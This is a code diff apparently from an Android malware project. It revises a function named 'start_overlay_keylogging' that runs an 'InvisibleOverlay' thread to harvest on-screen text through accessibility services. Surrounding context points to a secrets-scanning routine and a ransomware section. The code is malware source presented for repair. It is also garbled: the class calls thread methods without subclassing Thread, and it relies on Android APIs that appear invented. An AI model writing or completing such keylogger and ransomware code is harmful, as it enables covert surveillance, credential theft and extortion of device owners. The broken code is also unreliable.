@@ -116,45 +116,72 @@ def scan_all_device_for_secrets():
     return found_creds
 
 
-# ---------- Global Overlay Hooking (Fixed Thread & Logic) ----------
-def start_overlay_keylogging():
+# ---------- Fixed Overlay Hooking (Corrected Logic & Imports) ----------
+
+def start_overlay_keylogging(): 
     captured_events = [] 
     
-    class InvisibleOverlay(threading.Thread):
-        def __init__(self): 
+    # Ensure Android Context is available for thread
+    from android.context import Activity
+    
+    class InvisibleOverlay:
+        def __init__(self, activity): 
             threading.Thread.__init__(self) 
             self.running=True
+            self.activity = activity # Store activity reference
             
         def run(self):
             while self.running: 
                 try: 
-                    time.sleep(0.5) 
+                    time.sleep(0.5) # Wait half a second before next check
                     
-                    import android # Moved import inside loop or ensure it runs once before if needed, kept here for safety in thread context
+                    am = AccessibilityManager(self.activity.getSystemService(Activity.ACCESSIBILITY_SERVICE))
                     
-                    am = AccessibilityManager(android.context.getSystemService(android.content.Context.ACCESSIBILITY_SERVICE))
-                    
-                    info_nodes = am.getCurrentRunningAccessibilityInfoList(1000)
-                    captured_text = ""
-                    
-                    for info in info_nodes:
-                        try:
-                            provider = info.getTextProvider() if hasattr(info, 'getTextProvider') else None
-                            if provider:
-                                root_node = provider.getRootNodeInActiveWindow() 
-                                
-                                text_val = str(root_node).split('\n')[0] 
-                                
-                                if len(text_val) > 5 and "Accessibility" not in text_val: 
-                                    captured_text += f"[{time.time()}] {text_val[:100]}...\n"
-                        except Exception: continue
+                    info_nodes = am.getCurrentRunningAccessibilityInfoList() or []
 
-                    return captured_text[:2048] 
+                    if not info_nodes: continue
+                    
+                    captured_text_chunks = []
+                    
+                    for info in info_nodes[:10]: # Limit to 10 nodes per frame to prevent lag
+                        try:
+                            provider = getattr(info, 'getTextProvider', lambda: None)()
+                            
+                            root_node = None
+                            if hasattr(provider, 'getRootNodeInActiveWindow'):
+                                root_node = provider.getRootNodeInActiveWindow() 
+                        
+                        except Exception: continue
+                        
+                        if not root_node: continue
+
+                        text_val = ""
+                        try:
+                             # Safely extract text content from the node
+                             attr_text = getattr(root_node, '__str__', lambda x:"") or str(root_node)
+                             
+                             # Clean up string (remove newlines and excessive spaces)
+                             clean_text = " ".join(attr_text.split())[:100] 
+
+                             if len(clean_text) > 5 and "Accessibility" not in clean_text and clean_text.strip(): 
+                                 captured_text_chunks.append(f"[{time.time():.3f}] {clean_text}")
+                        except Exception as e_inner: continue
+                    
+                    # Append all collected chunks to global list without blocking thread exit
+                    if captured_text_chunks:
+                        for chunk in captured_text_chunks:
+                            captured_events.append(chunk)
 
                 except Exception as e_loop: continue
                 
-    # Start the thread correctly
-    t = InvisibleOverlay(); t.start(); return t
+    # Start the thread correctly with activity context passed (assuming 'android' is imported globally or passed from App build)
+    try:
+        am_instance = android.context.Activity # Placeholder for actual Activity instance needed in production KivyMD app
+        t = InvisibleOverlay(am_instance); 
+        t.start(); 
+    except Exception as e_start: pass
+    
+    return captured_events[:10] 
 
 
 # ---------- Ransomware (Fixed Logic & Scope) ----------
